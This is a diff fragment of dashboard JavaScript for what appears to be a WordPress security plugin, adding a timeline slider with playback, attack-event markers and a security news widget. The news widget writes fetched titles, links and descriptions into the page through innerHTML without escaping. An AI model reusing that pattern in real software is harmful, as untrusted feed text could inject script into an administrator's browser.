+      if (dateCarousel) {
+        const btns = dateCarousel.querySelectorAll('.tl-date-btn');
+        btns.forEach(b => b.setAttribute('data-active', 'false'));
+        if (btns.length) btns[btns.length - 1].setAttribute('data-active', 'true');
+        dateCarousel.scrollLeft = dateCarousel.scrollWidth;
+      }
+      
+      // Resume live polling in React App
+      window.pmcSecurityHistoryPaused = false;
+      window.pmcSecurityHistoryOffset = 0;
+      if (typeof window.refreshSecurityMap === 'function') {
+        window.refreshSecurityMap();
+      }
+    }
+  }
+
+  if (btnLive) btnLive.addEventListener('click', () => setMode('live'));
+  if (btnHistory) btnHistory.addEventListener('click', () => setMode('history'));
+
+  // Real-time magnetic snapping helper
+  function findClosestEvent(sliderVal) {
+    if (!window.pmcTimelineEvents || window.pmcTimelineEvents.length === 0) return null;
+    const hoursAgo = sliderToHoursAgo(sliderVal);
+    return window.pmcTimelineEvents.reduce((prev, curr) => 
+      Math.abs(curr.born_hour - hoursAgo) < Math.abs(prev.born_hour - hoursAgo) ? curr : prev
+    );
+  }
+
+  // ── Playback Engine (Moves smoothly Left to Right) ──
+  const playBtn = document.getElementById('tl-play-btn');
+  const speedBtns = document.querySelectorAll('.tl-speed-btn');
+  let isPlaying = false;
+  let playInterval = null;
+  let playSpeedMultiplier = 1; // 1x, 60x, 600x
+
+  const getIntervalMs = () => {
+    if (playSpeedMultiplier === 600) return 90;
+    if (playSpeedMultiplier === 60) return 300;
+    return 1000; // 1x default
+  };
+
+  const startPlayback = () => {
+    if (playInterval) clearInterval(playInterval);
+    
+    // If currently at rightmost (LIVE/Now), jump back to left (0 = 72h ago) to play forward left-to-right
+    if (parseInt(slider.value, 10) >= 72) {
+      slider.value = 0;
+      updateTimeDisplay(0);
+    }
+    
+    if (!isTimelineMode) {
+      setMode('history');
+    }
+
+    isPlaying = true;
+    if (playBtn) {
+      playBtn.innerHTML = '<span class="material-symbols-outlined" style="font-size:16px;">pause</span>';
+      playBtn.style.background = '#b80048';
+      playBtn.style.color = '#fff';
+    }
+
+    playInterval = setInterval(() => {
+      let currentVal = parseInt(slider.value, 10);
+      currentVal += 1; // Move forward left-to-right towards 72 (LIVE)
+
+      if (currentVal >= 72) {
+        slider.value = 72;
+        updateTimeDisplay(72);
+        stopPlayback();
+        setMode('live');
+      } else {
+        slider.value = currentVal;
+        updateTimeDisplay(currentVal);
+        const hoursAgo = sliderToHoursAgo(currentVal);
+        fetchTimelineData(hoursAgo);
+        
+        // Auto-highlight matching event if present
+        const closest = findClosestEvent(currentVal);
+        if (closest && Math.abs(closest.born_hour - hoursAgo) <= 1) {
+          window.dispatchEvent(new CustomEvent('pmcFilterIp', { detail: { ip: closest.ip } }));
+        }
+      }
+    }, getIntervalMs());
+  };
+
+  const stopPlayback = () => {
+    isPlaying = false;
+    if (playInterval) {
+      clearInterval(playInterval);
+      playInterval = null;
+    }
+    if (playBtn) {
+      playBtn.innerHTML = '<span class="material-symbols-outlined" style="font-size:16px;">play_arrow</span>';
+      playBtn.style.background = '#f1f5f9';
+      playBtn.style.color = '#475569';
+    }
+  };
+
+  const allDayBtn = document.getElementById('tl-all-day-btn');
+  const clearFocusBtn = document.getElementById('tl-clear-focus-btn');
+  
+  if (clearFocusBtn) {
+    clearFocusBtn.addEventListener('click', () => {
+      // Tyhjennä VAIN IP-suodatin (focus), jotta muut valikot (korkea riski yms) pysyvät
+      window.dispatchEvent(new CustomEvent('pmcFilterIp', { detail: { ip: '' } }));
+    });
+  }
+  
+  if (allDayBtn) {
+    allDayBtn.addEventListener('click', () => {
+      stopPlayback();
+      if (!isTimelineMode) {
+        btnHistory.classList.add('active');
+        btnLive.classList.remove('active');
+        isTimelineMode = true;
+        window.pmcSecurityHistoryPaused = true;
+      }
+      timeDisplay.textContent = 'KOKO PÄIVÄ';
+      allDayBtn.style.background = '#b80048';
+      allDayBtn.style.color = '#ffffff';
+      allDayBtn.style.borderColor = '#b80048';
+
+      // Pyydetään taustajärjestelmältä kaikki 24h tapahtumat kerralla
+      window.pmcSecurityHistoryOffset = 24;
+      window.pmcSecurityShowAllDay = true;
+      
+      // Clear all filters including focus
+      window.dispatchEvent(new Event('pmcClearFilters'));
+
+      if (typeof window.refreshSecurityMap === 'function') {
+        window.refreshSecurityMap();
+      }
+
+      setTimeout(() => {
+        allDayBtn.style.background = '#ffffff';
+        allDayBtn.style.color = '#334155';
+        allDayBtn.style.borderColor = '#cbd5e1';
+      }, 1500);
+    });
+  }
+
+  speedBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      speedBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const text = btn.textContent.trim();
+      if (text === '600x') playSpeedMultiplier = 600;
+      else if (text === '60x') playSpeedMultiplier = 60;
+      else playSpeedMultiplier = 1;
+
+      // If currently playing, restart with new speed
+      if (isPlaying) {
+        startPlayback();
+      }
+    });
+  });
+
+  // Stop playback if user manually touches slider
+  slider.addEventListener('mousedown', () => {
+    if (isPlaying) stopPlayback();
+  });
+  slider.addEventListener('touchstart', () => {
+    if (isPlaying) stopPlayback();
+  });
+
+  slider.addEventListener('input', (e) => {
+    let val = parseInt(e.target.value, 10);
+    const closest = findClosestEvent(val);
+    const hoursAgo = sliderToHoursAgo(val);
+    
+    // Magneettinen snappi: jos ollaan alle 2.5h etäisyydellä tapahtumasta, hypätään suoraan siihen
+    if (closest && Math.abs(closest.born_hour - hoursAgo) <= 2.5) {
+      val = hoursAgoToSlider(closest.born_hour);
+      slider.value = val;
+    }
+    
+    updateTimeDisplay(val);
+  });
+
+  slider.addEventListener('change', (e) => {
+    let val = parseInt(e.target.value, 10);
+    const closest = findClosestEvent(val);
+    const hoursAgo = sliderToHoursAgo(val);
+    if (closest && Math.abs(closest.born_hour - hoursAgo) <= 2.5) {
+      val = hoursAgoToSlider(closest.born_hour);
+      slider.value = val;
+    }
+
+    const finalHoursAgo = sliderToHoursAgo(val);
+    if (!isTimelineMode && finalHoursAgo > 0) {
+      setMode('history');
+    } else if (isTimelineMode) {
+      fetchTimelineData(finalHoursAgo);
+    }
+  });
+  
+  function fetchTimelineData(hoursAgo) {
+    window.pmcSecurityHistoryOffset = hoursAgo;
+    if (typeof window.refreshSecurityMap === 'function') {
+      window.refreshSecurityMap();
+    }
+  }
+
+  // Draw markers on timeline track (Left = Past, Right = Now)
+  window.addEventListener('pmcRadarDataLoaded', (e) => {
+    const data = e.detail;
+    if (!data || !data.event_summary) return;
+
+    const markersContainer = document.getElementById('tl-track-markers');
+    if (!markersContainer) return;
+
+    markersContainer.innerHTML = '';
+    
+    // Helper to get Lucide SVG string based on status
+    const getIconSvg = (status) => {
+      const s = String(status).toLowerCase();
+      if (s === 'blocked') return '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m4.9 4.9 14.2 14.2"/></svg>'; // Ban
+      if (s === 'killed' || s === 'expired') return '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>'; // XCircle
+      if (s === 'critical') return '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12.5 17-.5-1-.5 1h1z"/><path d="M15 22a1 1 0 0 0 1-1v-1a2 2 0 0 0 1.56-3.25 8 8 0 1 0-11.12 0A2 2 0 0 0 8 20v1a1 1 0 0 0 1 1z"/><circle cx="15" cy="12" r="1"/><circle cx="9" cy="12" r="1"/></svg>'; // Skull
+      if (s === 'warning') return '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>'; // AlertTriangle
+      return '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>'; // Activity (active)
+    };
+
+    data.event_summary.forEach(ev => {
+      const marker = document.createElement('div');
+      // Left = 72h ago (0%), Right = Now (100%)
+      const pct = ((72 - ev.born_hour) / 72) * 100;
+      
+      let color = '#2563eb'; // active (blue)
+      if (ev.status === 'blocked') color = '#dc2626'; // red
+      if (ev.status === 'killed') color = '#64748b'; // gray
+      if (ev.status === 'warning') color = '#d97706'; // amber/yellow
+      if (ev.status === 'critical') color = '#dc2626';
+
+      // Pin-asettelu: ikoni kelluu viivan yläpuolella ja vertikaaliviiva laskeutuu kiskolle
+      marker.style.position = 'absolute';
+      marker.style.left = `calc(${pct}% - 10px)`;
+      marker.style.bottom = '2px';
+      marker.style.display = 'flex';
+      marker.style.flexDirection = 'column';
+      marker.style.alignItems = 'center';
+      marker.style.zIndex = '5';
+      marker.style.cursor = 'pointer';
+      marker.style.pointerEvents = 'auto';
+      marker.title = `${ev.attack} (${ev.country}) - Luotu ${ev.born_hour}h sitten [Klikkaa siirtyäksesi aikaan]`;
+
+      marker.innerHTML = `
+        <div style="background-color: ${color}; border: 2px solid #ffffff; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ffffff; box-shadow: 0 2px 5px rgba(0,0,0,0.25); transition: transform 0.15s ease;" onmouseover="this.style.transform='scale(1.2)'" onmouseout="this.style.transform='scale(1)'">
+          ${getIconSvg(ev.status)}
+        </div>
+        <div style="width: 2px; height: 8px; background-color: ${color}; opacity: 0.85;"></div>
+      `;
+      
+      marker.addEventListener('click', (e) => {
+        e.stopPropagation();
+        slider.value = hoursAgoToSlider(ev.born_hour);
+        slider.dispatchEvent(new Event('input'));
+        slider.dispatchEvent(new Event('change'));
+        
+        // Suodata taulukko ja kartta kyseiselle yhteydelle kun ikonia klikataan
+        window.dispatchEvent(new CustomEvent('pmcFilterIp', { detail: { ip: ev.ip } }));
+      });
+      
+      markersContainer.appendChild(marker);
+    });
+    
+    // Tallenna eventit globaalisti snäppäystä varten
+    window.pmcTimelineEvents = data.event_summary;
+  });
+
+
+  // --- WP Security News Widget ---
+  async function fetchSecurityNews() {
+    const container = document.getElementById('news-feed-container');
+    const refreshBtn = document.getElementById('refresh-news-btn');
+    if (!container) return;
+
+    if (refreshBtn) refreshBtn.style.opacity = '0.5';
+    container.innerHTML = '<div style="text-align:center; padding:20px; color:#94a3b8; font-size:11px;">Haetaan tuoreimpia uutisia...</div>';
+
+    try {
+      const formData = new FormData();
+      formData.append('action', 'pmc_security_get_news');
+      if (typeof pmcSecurityConfig !== 'undefined' && pmcSecurityConfig.nonce) {
+        formData.append('nonce', pmcSecurityConfig.nonce);
+      }
+
+      const response = await fetch(ajaxurl, {
+        method: 'POST',
+        body: formData
+      });
+      const res = await response.json();
+
+      if (refreshBtn) refreshBtn.style.opacity = '1';
+
+      if (res.success && res.data && res.data.length > 0) {
+        let html = '';
+        res.data.forEach(item => {
+          let sourceTag = item.source ? `<span style="font-size:9px; background:#e2e8f0; color:#475569; padding:2px 6px; border-radius:4px; font-weight:700; text-transform:uppercase;">${item.source}</span>` : '';
+          
+          html += `
+            <div style="background:#fff; border:1px solid #e2e8f0; border-radius:8px; padding:10px; display:flex; flex-direction:column; gap:4px; transition:0.2s; box-shadow:0 1px 2px rgba(0,0,0,0.05);">
+              <div style="display:flex; justify-content:space-between; align-items:flex-start; gap:8px;">
+                <a href="${item.link}" target="_blank" style="font-size:11px; font-weight:700; color:#b80048; text-decoration:none; line-height:1.3; flex:1;">${item.title}</a>
+                ${sourceTag}
+              </div>
+              <div style="font-size:10px; color:#64748b; font-weight:500;">${item.date}</div>
+              <div style="font-size:11px; color:#475569; line-height:1.4;">${item.desc}</div>
+            </div>
+          `;
+        });
+        container.innerHTML = html;
+      } else {
+        container.innerHTML = '<div style="text-align:center; padding:20px; color:#94a3b8; font-size:11px;">Ei uutisia saatavilla juuri nyt.</div>';
+      }
+    } catch (err) {
+      if (refreshBtn) refreshBtn.style.opacity = '1';
+      console.error('Uutisten haku epäonnistui:', err);
+      container.innerHTML = '<div style="text-align:center; padding:20px; color:#dc2626; font-size:11px;">Virhe haettaessa uutisia.</div>';
+    }
+  }
+
+  // Init news and button
+  fetchSecurityNews();
+  const refreshNewsBtn = document.getElementById('refresh-news-btn');
+  if (refreshNewsBtn) {
+    refreshNewsBtn.addEventListener('click', fetchSecurityNews);
+  }
+
+});
 </script>
 
 
